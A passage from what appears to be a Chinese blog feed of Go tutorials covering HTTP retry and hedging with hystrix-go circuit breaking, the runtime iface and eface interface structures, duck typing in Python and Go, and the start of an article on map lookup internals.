&lt;- <span class="hljs-keyword">struct</span> &#123;<br>     resp  *http.Response<br>     err   <span class="hljs-type">error</span><br>     retry <span class="hljs-type">int</span><br>    &#125;&#123;resp: resp, err: err, retry: i&#125;<br>    <span class="hljs-keyword">return</span><br>   &#125;<br>   <span class="hljs-comment">// 如果正在重试，那么释放fd</span><br>   <span class="hljs-keyword">if</span> resp != <span class="hljs-literal">nil</span> &#123;<br>    resp.Body.Close()<br>   &#125;<br>   <span class="hljs-comment">// 重置body</span><br>   <span class="hljs-keyword">if</span> req.Body != <span class="hljs-literal">nil</span> &#123;<br>    resetBody(req, originalBody)<br>   &#125;<br>   time.Sleep(backoffStrategy(i) + <span class="hljs-number">1</span>*time.Microsecond)<br>  &#125;()<br> &#125;<br><br> <span class="hljs-keyword">select</span> &#123;<br> <span class="hljs-keyword">case</span> res := &lt;-multiplexCh:<br>  <span class="hljs-keyword">return</span> res.resp, res.err<br> <span class="hljs-keyword">case</span> &lt;-allRequestsBackCh:<br>  <span class="hljs-comment">// 到这里，说明全部的 goroutine 都执行完毕，但是都请求失败了</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, errors.New(<span class="hljs-string">&quot;all req finish，but all fail&quot;</span>)<br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="熔断-amp-降级"><a href="#熔断-amp-降级" class="headerlink" title="熔断 &amp; 降级"></a>熔断 &amp; 降级</h2><p>因为在我们使用 http 调用的时候，调用的外部服务很多时候其实并不可靠，很有可能因为外部的服务问题导致自身服务接口调用等待，从而调用时间过长，产生大量的调用积压，慢慢耗尽服务资源，最终导致服务调用雪崩的发生，所以在服务中使用熔断降级是非常有必要的一件事。</p><p>其实熔断降级的概念总体上来说，实现都差不多。核心思想就是通过全局的计数器，用来统计调用次数、成功&#x2F;失败次数。通过统计的计数器来判断熔断器的开关，熔断器的状态由三种状态表示：closed、open、half open，下面借用了 sentinel 的图来表示三者的关系：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/EzEnMOIbkiamyxLyWLibjWmjllfdh8UkGesW9eOHKicNhKDtZUmibgVMetK3xDUyU56iccRJWicRNmfIgKwL7VvjV4fQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p><p>首先初始状态是<code>closed</code>，每次调用都会经过计数器统计总次数和成功&#x2F;失败次数，然后在达到一定阈值或条件之后熔断器会切换到 <code>open</code>状态，发起的请求会被拒绝。</p><p>熔断器规则中会配置一个熔断超时重试的时间，经过熔断超时重试时长后熔断器会将状态置为 <code>half-open</code> 状态。这个状态对于 sentinel 来说会发起定时探测，对于 go-zero 来说会允许通过一定比例的请求，不管是主动定时探测，还是被动通过的请求调用，只要请求的结果返回正常，那么就需要重置计数器恢复到 <code>closed</code> 状态。</p><p>一般而言会支持两种熔断策略：</p><ul><li><strong>错误比率</strong>：熔断时间窗口内的请求数阈值错误率大于错误率阈值，从而触发熔断。</li><li><strong>平均 RT（响应时间）</strong>：熔断时间窗口内的请求数阈值大于平均 RT 阈值，从而触发熔断。</li></ul><p>比如我们使用 hystrix-go 来处理我们的服务接口的熔断，可以结合我们上面说的重试从而进一步保障我们的服务。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go">hystrix.ConfigureCommand(<span class="hljs-string">&quot;my_service&quot;</span>, hystrix.CommandConfig&#123; <br>        ErrorPercentThreshold:  <span class="hljs-number">30</span>,<br>    &#125;)<br>    _ = hystrix.Do(<span class="hljs-string">&quot;my_service&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-type">error</span> &#123; <br>       req, _ := http.NewRequest(<span class="hljs-string">&quot;POST&quot;</span>, <span class="hljs-string">&quot;http://localhost:8090/&quot;</span>, strings.NewReader(<span class="hljs-string">&quot;test&quot;</span>))<br>        _, err := retryDo(req, <span class="hljs-number">5</span>, <span class="hljs-number">20</span>*time.Millisecond, ExponentialBackoff)<br>        <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>            fmt.Println(<span class="hljs-string">&quot;get error:%v&quot;</span>,err)<br>            <span class="hljs-keyword">return</span> err<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>    &#125;, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(err <span class="hljs-type">error</span>)</span></span> <span class="hljs-type">error</span> &#123;<br>        fmt.Printf(<span class="hljs-string">&quot;handle  error:%v\n&quot;</span>, err)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>    &#125;) <br></code></pre></td></tr></table></figure><p>上面这个例子中就利用 hystrix-go 设置了最大错误百分比等于30，超过这个阈值就会进行熔断。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这篇文章从接口调用出发，探究了重试的几个要点，讲解了重试的几种策略；然后在实践环节中讲解了直接使用 <code>net/http</code>重试会有什么问题，对于对冲策略使用 channel 加上 waitgroup 来实现并发请求控制；最后使用 <code>hystrix-go</code> 来对故障服务进行熔断，防止请求堆积引起资源耗尽的问题。</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://github.com/sethgrid/pester">https://github.com/sethgrid/pester</a></p><p><a href="https://juejin.cn/post/6844904105354199047">https://juejin.cn/post/6844904105354199047</a></p><p><a href="https://github.com/ma6174/blog/issues/11">https://github.com/ma6174/blog/issues/11</a></p><p><a href="https://aws.amazon.com/cn/blogs/architecture/exponential-backoff-and-jitter/">https://aws.amazon.com/cn/blogs/architecture/exponential-backoff-and-jitter/</a></p><p><a href="https://medium.com/@trongdan_tran/circuit-breaker-and-retry-64830e71d0f6">https://medium.com/@trongdan_tran/circuit-breaker-and-retry-64830e71d0f6</a></p><p><a href="https://www.lixueduan.com/post/grpc/09-retry/">https://www.lixueduan.com/post/grpc/09-retry/</a></p><p><a href="https://en.wikipedia.org/wiki/Thundering_herd_problem">https://en.wikipedia.org/wiki/Thundering_herd_problem</a></p><p><a href="https://go-zero.dev/cn/docs/blog/governance/breaker-algorithms/">https://go-zero.dev/cn/docs/blog/governance/breaker-algorithms/</a></p><p><a href="https://sre.google/sre-book/handling-overload/#eq2101">https://sre.google/sre-book/handling-overload/#eq2101</a></p><p><a href="https://sentinelguard.io/zh-cn/docs/golang/circuit-breaking.html">https://sentinelguard.io/zh-cn/docs/golang/circuit-breaking.html</a></p><p><a href="https://github.com/afex/hystrix-go">https://github.com/afex/hystrix-go</a></p><p><a href="https://segmentfault.com/a/1190000039978117">https://segmentfault.com/a/1190000039978117</a></p>]]></content>
    
    
    <categories>
      
      <category>golang</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
      <tag>golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Golang接口的底层实现</title>
    <link href="/2022/12/18/Golang%E6%8E%A5%E5%8F%A3%E7%9A%84%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0/"/>
    <url>/2022/12/18/Golang%E6%8E%A5%E5%8F%A3%E7%9A%84%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Golang接口的底层实现"><a href="#Golang接口的底层实现" class="headerlink" title="Golang接口的底层实现"></a>Golang接口的底层实现</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>接口是高级语言中的一个规约，是一组方法签名的集合。在Golang中， 接口是非侵入式的，具体类型实现 interface 不需要在语法上显式的声明，只需要具体类型的方法集合是 interface 方法集合的超集，就表示该类实现了这一 interface。编译器在编译时会进行 interface 校验。interface 和具体类型不同，它不能实现具体逻辑，也不能定义字段。</p><h2 id="底层数据结构"><a href="#底层数据结构" class="headerlink" title="底层数据结构"></a>底层数据结构</h2><p>Golang中接口的底层结构体有两种，分别是<code>iface</code> 和 <code>eface</code>，其中<code>iface</code> 描述的接口包含方法，而 <code>eface</code> 则是不包含任何方法的空接口：<code>interface&#123;&#125;</code>。</p><h3 id="iface源码"><a href="#iface源码" class="headerlink" title="iface源码"></a>iface源码</h3><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-keyword">type</span> iface <span class="hljs-keyword">struct</span> &#123;<br>tab  *itab  <span class="hljs-comment">// 存放类型、方法等信息</span><br>data unsafe.Pointer  <span class="hljs-comment">//  指针指向的 iface 绑定对象的原始数据的副本</span><br>&#125;<br><br><span class="hljs-keyword">type</span> itab <span class="hljs-keyword">struct</span> &#123;<br>inter  *interfacetype<br>_type  *_type<br>link   *itab<br>hash   <span class="hljs-type">uint32</span> <span class="hljs-comment">// copy of _type.hash. Used for type switches.</span><br>bad    <span class="hljs-type">bool</span>   <span class="hljs-comment">// type does not implement interface</span><br>inhash <span class="hljs-type">bool</span>   <span class="hljs-comment">// has this itab been added to hash?</span><br>unused [<span class="hljs-number">2</span>]<span class="hljs-type">byte</span><br>fun    [<span class="hljs-number">1</span>]<span class="hljs-type">uintptr</span> <span class="hljs-comment">// variable sized</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>iface</code> 内部维护两个指针，tab 中存放的是类型、方法等信息。data 指针指向的 iface 绑定对象的原始数据的副本。这里同样遵循 Go 的统一规则，值传递。tab 是 itab 类型的指针。</p><p>itab 中包含 5 个字段。inner 存的是 interface 自己的静态类型。_type 存的是 interface 对应具体对象的类型。itab 中的 _type 和 iface 中的 data 能简要描述一个变量。_type 是这个变量对应的类型，data 是这个变量的值。这里的 hash 字段和 _type 中存的 hash 字段是完全一致的，这么做的目的是为了类型断言(下文会提到)。fun 是一个函数指针，它指向的是具体类型的函数方法。虽然这里只有一个函数指针，但是它可以调用很多方法。在这个指针对应内存地址的后面依次存储了多个方法，利用指针偏移便可以找到它们。</p><p>由于 Go 语言是强类型语言，编译时对每个变量的类型信息做强校验，所以每个类型的元信息要用一个结构体描述。再者 Go 的反射也是基于类型的元信息实现的。_type 就是所有类型最原始的元信息。</p><p>整体结构如下：</p><p><img src="https://golang.design/go-questions/interface/assets/0.png" alt="iface 结构体全景"></p><h3 id="eface源码"><a href="#eface源码" class="headerlink" title="eface源码"></a>eface源码</h3><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-keyword">type</span> eface <span class="hljs-keyword">struct</span> &#123;<br>    _type *_type<br>    data  unsafe.Pointer<br>&#125;<br></code></pre></td></tr></table></figure><p>eface作为空的 inferface{} 是没有方法集的接口。所以不需要 itab 数据结构。它只需要存类型和类型对应的值即可。对应的数据结构如下：</p><p>从这个数据结构可以看出，只有当 2 个字段都为 nil，空接口才为 nil。空接口的主要目的有 2 个，一是实现“泛型”，二是使用反射。<strong>所以空接口并不等于nil</strong>，这是常见的犯错点。</p><h3 id="关于type的结构体"><a href="#关于type的结构体" class="headerlink" title="关于type的结构体"></a>关于type的结构体</h3><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-keyword">type</span> _type <span class="hljs-keyword">struct</span> &#123;<br>    <span class="hljs-comment">// 类型大小</span><br>size       <span class="hljs-type">uintptr</span><br>    ptrdata    <span class="hljs-type">uintptr</span><br>    <span class="hljs-comment">// 类型的 hash 值</span><br>    hash       <span class="hljs-type">uint32</span><br>    <span class="hljs-comment">// 类型的 flag，和反射相关</span><br>    tflag      tflag<br>    <span class="hljs-comment">// 内存对齐相关</span><br>    align      <span class="hljs-type">uint8</span><br>    fieldalign <span class="hljs-type">uint8</span><br>    <span class="hljs-comment">// 类型的编号，有bool, slice, struct 等等等等</span><br>kind       <span class="hljs-type">uint8</span><br>alg        *typeAlg<br><span class="hljs-comment">// gc 相关</span><br>gcdata    *<span class="hljs-type">byte</span><br>str       nameOff<br>ptrToThis typeOff<br>&#125;<br></code></pre></td></tr></table></figure><p>Go 语言各种数据类型都是在 <code>_type</code> 字段的基础上，增加一些额外的字段来进行管理的，这些数据类型的结构体定义，也是反射实现的基础。</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-comment">//数组类型</span><br><span class="hljs-keyword">type</span> arraytype <span class="hljs-keyword">struct</span> &#123;<br>typ   _type<br>elem  *_type<br>slice *_type<br><span class="hljs-built_in">len</span>   <span class="hljs-type">uintptr</span><br>&#125;<br><br><span class="hljs-comment">//通道类型</span><br><span class="hljs-keyword">type</span> chantype <span class="hljs-keyword">struct</span> &#123;<br>typ  _type<br>elem *_type<br>dir  <span class="hljs-type">uintptr</span><br>&#125;<br><br><span class="hljs-comment">//切片类型</span><br><span class="hljs-keyword">type</span> slicetype <span class="hljs-keyword">struct</span> &#123;<br>typ  _type<br>elem *_type<br>&#125;<br><br><span class="hljs-comment">//结构体类型</span><br><span class="hljs-keyword">type</span> structtype <span class="hljs-keyword">struct</span> &#123;<br>typ     _type<br>pkgPath name<br>fields  []structfield<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>1.<a href="https://golang.design/go-questions/interface/iface-eface/">iface与eface的区别是什么</a></p><p>2.<a href="https://halfrost.com/go_interface/">深入研究 Go interface 底层实现</a></p>]]></content>
    
    
    <categories>
      
      <category>golang</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Golang的语言特性与鸭子类型</title>
    <link href="/2022/12/17/Golang%E7%9A%84%E8%AF%AD%E8%A8%80%E7%89%B9%E6%80%A7%E4%B8%8E%E9%B8%AD%E5%AD%90%E7%B1%BB%E5%9E%8B/"/>
    <url>/2022/12/17/Golang%E7%9A%84%E8%AF%AD%E8%A8%80%E7%89%B9%E6%80%A7%E4%B8%8E%E9%B8%AD%E5%AD%90%E7%B1%BB%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="Golang的语言特性与鸭子类型"><a href="#Golang的语言特性与鸭子类型" class="headerlink" title="Golang的语言特性与鸭子类型"></a>Golang的语言特性与鸭子类型</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h3 id="什么是鸭子类型？"><a href="#什么是鸭子类型？" class="headerlink" title="什么是鸭子类型？"></a>什么是鸭子类型？</h3><blockquote><p><em>Suppose you see a bird walking around in a farm yard. This bird has no label that says ‘duck’. But the bird certainly looks like a duck. Also, he goes to the pond and you notice that he swims like a duck. Then he opens his beak and quacks like a duck. Well, by this time you have probably reached the conclusion that the bird is a duck, whether he’s wearing a label or not.</em></p></blockquote><p>上述是对于<strong>鸭子类型</strong>的最有名的阐述。意思是对于事物类型的判断， 不取决于事物本身预设的标签（label）， 而取决于判断者判断时需要用到的条件， 如果事物拥有符合条件的属性，那么在判断者眼中它就是那种类型。当看到一只鸟走起来像鸭子、游泳起来像鸭子、叫起来也像鸭子，那么这只鸟就可以被称为鸭子。</p><p>在鸭子类型中，关注点在于对象的行为，能做什么；而不是关注对象所属的类型。例如，在不使用鸭子类型的语言中，我们可以编写一个函数，它接受一个类型为“鸭子”的对象，并调用它的“走”和“叫”方法。在使用鸭子类型的语言中，这样的一个函数可以接受一个任意类型的对象，并调用它的“走”和“叫”方法。如果这些需要被调用的方法不存在，那么将引发一个运行时错误。任何拥有这样的正确的“走”和“叫”方法的对象都可被函数接受的这种行为引出了以上表述，这种决定类型的方式因此得名。</p><p>在程序设计中，鸭子类型（英语：Duck typing）是动态类型和某些静态语言的一种对象推断风格。这种风格适用于动态语言(比如PHP、Python、Ruby、Typescript、Lua、JavaScript、Java、Groovy、C#等)和静态语言(比如Golang来说，静态类型语言在编译时便已确定了变量的类型，但是Golang的实现是：在编译时推断变量的类型)，支持”鸭子类型”的语言的解释器&#x2F;编译器将会在解析(Parse)或编译时，推断对象的类型。</p><p>动态语言和静态语言的差别在此就有所体现。<strong>静态语言在编译期间就能发现类型不匹配的错误，不像动态语言，必须要运行到那一行代码才会报错</strong>。静态语言要求程序员在编码阶段就要按照规定来编写程序，为每个变量规定数据类型，这在某种程度上，加大了工作量，也加长了代码量。动态语言则没有这些要求，可以让人更专注在代码逻辑上。</p><p>Go 语言作为一门现代静态语言，是有后发优势的。它引入了动态语言的便利，同时又会进行静态语言的类型检查。Go 采用了折中的做法：<strong>不要求类型显示地声明实现了某个接口，只要实现了相关的方法即可，编译器就能检测到。</strong></p><h2 id="动态语言-python-的duck-typing"><a href="#动态语言-python-的duck-typing" class="headerlink" title="动态语言(python)的duck typing"></a>动态语言(python)的duck typing</h2><p>假如有个叫<code>say_quack</code>的<code>Python</code>函数, 它接受一个接口参数，参数的类型不固定，只要有<code>quack</code>方法就可以啦。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">say_quack</span>(<span class="hljs-params">duck</span>)<br>    duck.quack()<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RealDcuk</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">quack</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;quack quack&quot;</span>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ToyDuck</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">quack</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;squee squee&quot;</span>)<br><br>duck = RealDuck()<br>say_quack(duck)<br><br>toyDuck = ToyDuck()<br>say_quack(duck)<br></code></pre></td></tr></table></figure><p>可以看出动态语言的duck typing非常灵活方便，类型的检测和使用不依赖于编译器的静态检测，而是依赖文档、清晰的代码和测试来确保正确使用。这样其实是牺牲了安全性来换取灵活性。 假设你没有认真看文档，不知道<code>say_quack</code>方法的<code>duck</code>参数是需要<code>quack</code>方法， 你编写了一个其他类，它只有一个<code>run</code>方法， 你把它的对象当成参数给<code>say_quack</code>编译时也是不会报错的。只有在运行时才会报错， 这样就存在很大的安全隐患。</p><p>所以，有没有一种折中（tradeoff）， 兼顾这种duck typing的灵活性和静态检测的安全性呢？</p><h2 id="go语言接口的隐式实现"><a href="#go语言接口的隐式实现" class="headerlink" title="go语言接口的隐式实现"></a>go语言接口的隐式实现</h2><p>假如你有个golang的接口叫Duck：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Duck <span class="hljs-keyword">interface</span> &#123;<br>    quack()<br>&#125;<br></code></pre></td></tr></table></figure><p>任何拥有<code>quack</code>方法的类型， 都隐式地（implicitly）实现了<code>Duck</code>接口， 并能当做Duck接口使用。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;fmt&quot;</span><br>)<br><br><span class="hljs-keyword">type</span> Duck <span class="hljs-keyword">interface</span> &#123;<br>    quack()<br>&#125;<br><br><span class="hljs-keyword">type</span> RealDuck <span class="hljs-keyword">struct</span> &#123;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(d RealDuck)</span></span> quack() &#123;<br>    fmt.Println(<span class="hljs-string">&quot;quack quack&quot;</span>)<br>&#125;<br><br><span class="hljs-keyword">type</span> ToyDuck <span class="hljs-keyword">struct</span> &#123;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(d ToyDuck)</span></span> quack() &#123;<br>    fmt.Println(<span class="hljs-string">&quot;squee squee&quot;</span>)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">sayQuack</span><span class="hljs-params">(d Duck)</span></span> &#123;<br>    d.quack()<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    realDuck := RealDuck&#123;&#125;<br>    toyDuck := ToyDuck&#123;&#125;<br><br>    sayQuack(realDuck)<br><br>    sayQuack(toyDuck)<br><br>&#125;<br></code></pre></td></tr></table></figure><p>如果你有一个<code>Dog</code>类型， 它没有quack方法， 当你用它做sayQuack参数时， 编译时就会报错。另外来说， 如果接口使用者定义了一个新的接口也拥有quack方法， 那上面的<code>RealDuck</code>和<code>ToyDuck</code>也可以当做新的接口来使用。</p><p>这样就达到了一个灵活性和安全性的平衡。因为go对接口的实现是隐式的， 所以它的接口类型在使用之前是不固定的， 它可以灵活的变成各种接口类型，只要它满足使用者的对接口的要求。 又因为使用者使用接口时在编译时就对接口实现者有没有满足接口需求进行了检测，所以又兼顾了安全性。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol><li><p><a href="https://golang.design/go-questions/interface/duck-typing/">go语言与鸭子类型的关系</a></p></li><li><p><a href="https://my.oschina.net/chinaliuhan/blog/3123026">Golang 的 interface 及 duck typing 鸭子类型</a></p></li></ol>]]></content>
    
    
    <categories>
      
      <category>golang</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Golang中map增删改查操作的实现原理</title>
    <link href="/2022/12/17/Go%E4%B8%ADmap%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5%E6%93%8D%E4%BD%9C%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/"/>
    <url>/2022/12/17/Go%E4%B8%ADmap%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5%E6%93%8D%E4%BD%9C%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="Golang中map增删改查操作的实现原理"><a href="#Golang中map增删改查操作的实现原理" class="headerlink" title="Golang中map增删改查操作的实现原理"></a>Golang中map增删改查操作的实现原理</h1><blockquote><p>本文内容主要引用自<a href="https://zhuanlan.zhihu.com/p/273666774">深入解析Golang的map设计</a></p></blockquote><p>上一篇文章主要介绍了map的基本原理与创建map是如何实现的，这一篇文章让我们学习map增删改查操作的实现原理</p><h3 id="查找key"><a href="#查找key" class="headerlink" title="查找key"></a>查找key</h3><p>对于map的元素查找，其源码实现如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//src/runtime/hashmap_fast.go</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">mapaccess1</span><span class="hljs-params">(t *maptype, h *hmap, key unsafe.Pointer)</span></span> unsafe.Pointer &#123;<br>  <span class="hljs-comment">// 如果开启了竞态检测 -race</span><br>    <span class="hljs-keyword">if</span> raceenabled &amp;&amp; h != <span class="hljs-literal">nil</span> &#123;<br>        callerpc := getcallerpc()<br>        pc := funcPC(mapaccess1)<br>        racereadpc(unsafe.Pointer(h), callerpc, pc)<br>        raceReadObjectPC(t.key, key, callerpc, pc)<br>    &#125;<br>  <span class="hljs-comment">// 如果开启了memory sanitizer -msan</span><br>    <span class="hljs-keyword">if</span> msanenabled &amp;&amp; h != <span class="hljs-literal">nil</span> &#123;<br>        msanread(key, t.key.size)<br>    &#125;<br>  <span class="hljs-comment">// 如果map为空或者元素个数为0，返回零值</span><br>    <span class="hljs-keyword">if</span> h == <span class="hljs-literal">nil</span> || h.count == <span class="hljs-number">0</span> &#123;<br>        <span class="hljs-keyword">if</span> t.hashMightPanic() &#123;<br>            t.hasher(key, <span class="hljs-number">0</span>) <span class="hljs-comment">// see issue 23734</span><br>        &#125;<br>        <span class="hljs-keyword">return</span> unsafe.Pointer(&amp;zeroVal[<span class="hljs-number">0</span>])<br>    &#125;<br>  <span class="hljs-comment">// 注意，这里是按位与操作</span><br>  <span class="hljs-comment">// 当h.flags对应的值为hashWriting（代表有其他goroutine正在往map中写key）时，那么位计算的结果不为0，因此抛出以下错误。</span><br>  <span class="hljs-comment">// 这也表明，go的map是非并发安全的</span><br>    <span class="hljs-keyword">if</span> h.flags&amp;hashWriting != <span class="hljs-number">0</span> &#123;<br>        throw(<span class="hljs-string">&quot;concurrent map read and map write&quot;</span>)<br>    &#125;<br>  <span class="hljs-comment">// 不同类型的key，会使用不同的hash算法，可详见src/runtime/alg.go中typehash函数中的逻辑</span><br>    hash := t.hasher(key, <span class="hljs-type">uintptr</span>(h.hash0))<br>    m := bucketMask(h.B)<br>  <span class="hljs-comment">// 按位与操作，找到对应的bucket</span><br>    b := (*bmap)(add(h.buckets, (hash&amp;m)*<span class="hljs-type">uintptr</span>(t.bucketsize)))<br>  <span class="hljs-comment">// 如果oldbuckets不为空，那么证明map发生了扩容</span><br>  <span class="hljs-comment">// 如果有扩容发生，老的buckets中的数据可能还未搬迁至新的buckets里</span><br>  